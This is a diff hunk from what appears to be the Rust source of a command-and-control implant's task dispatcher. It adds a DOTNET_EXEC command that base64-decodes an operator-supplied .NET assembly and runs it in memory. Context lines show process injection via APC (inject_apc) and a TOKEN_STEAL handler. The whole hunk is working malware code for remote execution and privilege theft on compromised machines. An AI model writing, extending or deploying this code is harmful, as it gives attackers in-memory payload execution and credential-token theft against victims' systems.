@@ -653,6 +653,18 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
             let r = unsafe { inject_apc(pid, &task.payload) };
             t.send_result(task.id, &r, "");
         }
+        "DOTNET_EXEC" => {
+            let j = serde_json::from_str::<serde_json::Value>(&task.args).unwrap_or_default();
+            let b64 = j.get("asm").and_then(|v| v.as_str()).unwrap_or("");
+            if b64.is_empty() { t.send_result(task.id, "", "DOTNET_EXEC: missing asm field"); return; }
+            let asm_bytes = match STANDARD.decode(b64) {
+                Ok(v) => v,
+                Err(e) => { t.send_result(task.id, "", &format!("b64 decode: {}", e)); return; }
+            };
+            let asm_args = j.get("args").and_then(|v| v.as_str()).unwrap_or("").to_string();
+            let r = crate::dotnet::exec_dotnet(&asm_bytes, &asm_args);
+            t.send_result(task.id, &r, "");
+        }
         "TOKEN_STEAL" => {
             let pid = serde_json::from_str::<serde_json::Value>(&task.args)
                 .ok().and_then(|v| v.get("pid").and_then(|p| p.as_u64())).unwrap_or(0) as u32;
